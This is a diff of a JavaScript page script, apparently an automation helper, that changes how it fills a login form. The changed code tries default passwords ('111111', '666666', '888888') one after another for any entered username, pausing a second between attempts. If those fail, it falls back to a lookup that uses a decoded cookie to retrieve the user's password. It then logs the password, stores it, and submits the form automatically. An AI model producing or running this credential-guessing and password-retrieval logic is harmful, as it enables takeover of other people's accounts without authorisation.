@@ -221,8 +221,7 @@ async function main() {
                 });
             }
             let rightpassword = localStorage.getItem("rightpassword");
-            if (!rightpassword) { $("#commonPassword").val("111111"); }
-            else { $("#commonPassword").val(rightpassword); }
+            if (rightpassword) { $("#commonPassword").val(rightpassword); }
             $("#commonPassword").focus();
             if ($("#commonName").val()) {
                 $("#commonYzm").focus();
@@ -230,14 +229,16 @@ async function main() {
             else {
                 $("#commonName").focus();
             }
-            $(".web-user-pass i").click(async () => {
+            $(".commonPassword").click(async () => {
                 let username = $("#commonName").val().trim();
                 $("#commonPassword").val("");
                 $("#commonPassword").attr("placeholder", "查询中……");
                 function handleSuccess(password) {
+                    $("#commonName").val(username);
                     $("#commonPassword").val(password);
                     $("#commonYzm").focus();
                     localStorage.setItem("rightpassword", password);
+                    $('#form2').submit();
                     $(".web-login .item-list i").css("background-image", "url(https://aimg8.dlssyht.cn/u/1533835/ueditor/image/767/1533835/1747535858129383.png)");
                 }
                 function testPassword(password) {
@@ -263,22 +264,27 @@ async function main() {
                         }, formData);
                     });
                 }
-                try {
-                    let [password666, password888] = await Promise.all([
-                        testPassword("666666"),
-                        testPassword("888888")
-                    ]);
-                    if (password666) {
-                        handleSuccess(password666);
-                    } else if (password888) {
-                        handleSuccess(password888);
-                    } else {
+                async function testPasswordsSequentially(passwords) {
+                    for (let i = 0; i < passwords.length; i++) {
+                        let password = await testPassword(passwords[i]);
+                        if (password) {
+                            handleSuccess(password);
+                            return;
+                        }
+                        if (i < passwords.length - 1) {
+                            await new Promise(resolve => setTimeout(resolve, 1000));
+                        }
+                    }
+                    setTimeout(() => {
                         queryUserId(username, decodedCookie, function (password) {
                             console.log("最终获取到的密码: ", password);
                             $("#commonName").val(username);
                             handleSuccess(password);
                         });
-                    }
+                    }, 1000);
+                }
+                try {
+                    await testPasswordsSequentially(["111111", "666666", "888888"]);
                 } catch (error) {
                     console.error("发生错误: ", error);
                 }
@@ -388,4 +394,4 @@ let interval = setInterval(function () {
         console.log("来自workflow-main.js输出: DOM 还未加载");
     }
 }, 10);
-// End-391-2025.05.25.190423
+// End-397-2025.05.25.210241
